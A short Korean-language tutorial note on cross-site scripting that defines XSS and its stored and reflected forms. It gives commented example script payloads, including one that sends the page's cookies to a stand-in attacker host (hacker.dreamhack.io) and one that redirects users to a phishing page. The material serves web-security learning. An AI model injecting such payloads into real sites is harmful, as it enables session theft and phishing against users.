# 서론
### XSS란?
* 클라이언트에는 웹 페이지의 이용자를 대상으로 공격할 수 있다.
>> 예를 들어 세션 및 쿠키 정보를 탈취하고 해당 계정으로 '임의의' 기능을 수행 가능하다.

### 💡 Cross-Site Scripting의 약어가 XSS인 이유
>> Cross-site scripting의 약어는 CSS라고 불리는 것이 옳습니다. 그러나 스타일시트를 정의하는 언어인 CSS와의 중복으로, 혼동되어 사용될 수 있기 때문에 XSS로 명명되었습니다.

### Cross-Site Scripting (XSS)
* 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 공격을 주로 XSS이라고 한다.

### XSS 공격 코드 예시

#### 쿠키 생성 후 URL인젝션  
```java
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

#### 페이지 삽입
```java
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

#### 페이지 변조 공격 코드
```java
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

### 키워드
* Cross-Site Scripting (XSS): 클라이언트 사이드 취약점, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 취약점.

* Stored XSS: 악성 스크립트가 서버 내에 존재, 이용자가 저장된 악성 스크립트를 조회할 때 발생

* Reflected XSS: 악성 스크립트가 이용자 요청 내에 존재, 이용자가 악성 스크립트가 포함된 요청을 보낸 후 응답을 출력할 때 발생